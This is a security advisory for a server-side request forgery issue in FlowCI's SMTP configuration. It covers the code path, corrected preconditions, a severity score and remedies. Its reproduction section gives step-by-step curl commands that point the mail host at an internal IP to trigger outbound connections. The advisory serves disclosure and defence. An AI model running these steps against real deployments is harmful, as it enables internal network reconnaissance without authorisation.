# Server-Side Request Forgery (SSRF) via SMTP Configuration in FlowCI Flow Platform X (Revalidated)

## Affected Environment

- **Project:** FlowCI Flow Platform X (`flow-core-x`)
- **Repository:** https://github.com/FlowCI/flow-core-x
- **Validated Version:** `1.23.01`
- **Revalidation Date:** `2026-03-03`
- **Technology Stack:** Java, Spring Boot, MongoDB, JavaMail

## Executive Summary

A **server-side outbound connection control issue** exists in the SMTP configuration and email trigger path.

If a user can save SMTP configuration (`/configs/{name}/smtp`) and cause email trigger execution, they can set SMTP host to arbitrary hostname/IP. The server then attempts outbound connection to that destination when email is sent.

This is a valid SSRF-style primitive (server-side controlled egress), but the original report overstated the default attack precondition.

## Corrected Key Facts

- **Attack Vector:** Network
- **Authentication Required:** Yes (when `app.auth.enabled=true`, default)
- **Privileges Required (default RBAC):** **High** (Admin-level actions by default)
- **User Interaction:** None (trigger-driven execution)
- **Scope:** Unchanged

## What Is Actually Vulnerable

### 1) User-controlled SMTP host is persisted without destination policy checks

File: `core/src/main/java/com/flowci/core/config/service/ConfigServiceImpl.java`

- `save(String name, SmtpOption option)` stores `option.getServer()` directly into config.
- No allowlist/denylist for private IPs, loopback, link-local, metadata endpoints, or internal domains.

### 2) Email sender uses stored host directly

File: `core/src/main/java/com/flowci/core/config/service/ConfigServiceImpl.java`

- `getEmailSender(String smtpConfig)` calls:
  - `mailSender.setHost(c.getServer())`
  - `mailSender.setPort(c.getPort())`

### 3) Trigger execution reaches network sink

File: `core/src/main/java/com/flowci/core/trigger/service/TriggerServiceImpl.java`

- `doSend(EmailTrigger t, Vars<String> context)` uses `configService.getEmailSender(...)`
- then calls `sender.send(mime)`

## Correct Attack Preconditions

### Required permissions in default setup

By default permission map:

- `ConfigAction.ALL` -> Admin
- `TriggerActions.ALL` -> Admin

File: `core/src/main/java/com/flowci/core/auth/config/AuthConfig.java`

So under default configuration, this is **not** a low-privilege developer path.

### Authentication model corrections

- Web endpoints (`/configs/**`, `/triggers/**`) are protected by `webAuth` interceptor.
- Web token header is `Token` (not `Authorization: Bearer`).
- Login endpoint is `/auth/login` using **Basic** auth header.

Relevant files:

- `core/src/main/java/com/flowci/core/common/config/WebConfig.java`
- `core/src/main/java/com/flowci/core/auth/controller/WebAuth.java`
- `core/src/main/java/com/flowci/core/auth/controller/AuthController.java`

## Corrected Data Flow

1. Authenticated high-privilege user saves SMTP config via `POST /configs/{name}/smtp`.
2. `server` value is stored without network destination restriction.
3. Email trigger references that SMTP config.
4. Trigger event fires (`OnJobFinished` / `OnAgentStatusChange`).
5. Server creates `JavaMailSender` with attacker-chosen host and sends email.
6. Outbound connection is made from FlowCI server to chosen destination.

## Impact Assessment (Recalibrated)

### Practical impact

- Internal network reachability probing via SMTP connection attempts.
- Potential delay/timeout impact by pointing to blackhole/unreachable hosts.
- Outbound policy bypass risk when CI server has broad egress.

### What should **not** be overstated

- This is not unauthenticated exploitation in default setup.
- This is not low-privilege exploitation in default setup.
- Pointing SMTP to `169.254.169.254` does not directly imply metadata HTTP data exfiltration through this sink; SMTP protocol mismatch usually limits that to connect-level behavior.

## Corrected Severity

Recommended scoring (default deployment assumptions):

- **CVSS v3.1:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:L`
- **Score:** `4.8 (MEDIUM)`

Rationale: exploit needs high privilege (Admin-equivalent action grants) by default.

## Reproduction (Corrected)

### Step 1: Login and obtain web token

> FlowCI uses `/auth/login` with `Authorization: Basic base64(email:md5_password)`.

Example:

```bash
BASIC=$(printf '%s' 'admin@example.com:<md5_password>' | base64 -w0)
TOKEN=$(curl -s -X POST 'http://target-flowci:8080/auth/login' \
  -H "Authorization: Basic ${BASIC}" | jq -r '.token')
```

### Step 2: Create SMTP config with internal target

```bash
curl -X POST 'http://target-flowci:8080/configs/internal-recon/smtp' \
  -H 'Content-Type: application/json' \
  -H "Token: ${TOKEN}" \
  -d '{
    "server": "10.0.0.25",
    "port": 25,
    "secure": "NONE",
    "auth": {
      "username": "probe",
      "password": "probe"
    }
  }'
```

### Step 3: Create email trigger using that SMTP config

```bash
curl -X POST 'http://target-flowci:8080/triggers/email' \
  -H 'Content-Type: application/json' \
  -H "Token: ${TOKEN}" \
  -d '{
    "name": "smtp-ssrf-test",
    "event": "OnJobFinished",
    "smtpConfig": "internal-recon",
    "to": "ops@example.com",
    "subject": "job finished",
    "template": "default"
  }'
```

### Step 4: Trigger a job completion event

```bash
curl -X POST 'http://target-flowci:8080/jobs/run' \
  -H 'Content-Type: application/json' \
  -H "Token: ${TOKEN}" \
  -d '{
    "flow": "demo-flow",
    "inputs": {}
  }'
```

### Step 5: Observe outbound connection from FlowCI host

Monitor destination side (`10.0.0.25:25`) or egress logs; FlowCI server attempts SMTP connection.

## Security Recommendations

### 1) Validate destination on save and on use

Enforce policy for SMTP server field:

- Block loopback (`127.0.0.0/8`, `::1`)
- Block private ranges (`10/8`, `172.16/12`, `192.168/16`)
- Block link-local/metadata (`169.254.0.0/16`, especially `169.254.169.254`)
- Optionally allow only approved SMTP domains

### 2) Add egress network restrictions

At host/container/network layer, allow outbound SMTP only to approved mail relays.

### 3) Harden authorization

Keep SMTP config and trigger save actions restricted to trusted admins only.
Audit role grants periodically.

### 4) Add operational detection

Alert on:

- SMTP server updates to IP literals/internal domains
- SMTP ports outside expected values (`25/465/587`)
- Frequent SMTP config churn

## Detection Hints

- Monitor `POST /configs/*/smtp` with suspicious `server` values.
- Correlate trigger deliveries with repeated timeouts/failures and unusual destination hosts.
- Maintain audit trail of config changes (`who`, `when`, `old -> new`).

## Notes on Original Report Corrections

The following claims in the previous version were inaccurate for default FlowCI setup:

1. **"Privileges Required: Low"** -> corrected to **High (default RBAC)**.
2. **`/api/configs/...` and `Authorization: Bearer`** for web config APIs -> corrected to **`/configs/...` with `Token` header**.
3. Overstated metadata exfiltration via SMTP sink -> corrected to connect-level SSRF behavior unless additional protocol-compatible conditions exist.

## Final Verdict

- **Exists:** Yes, controllable server-side outbound SMTP connection primitive exists.
- **Exploitability (default):** Requires Admin-equivalent permissions.
- **Priority:** Medium; fix with destination validation + egress controls + strict RBAC.
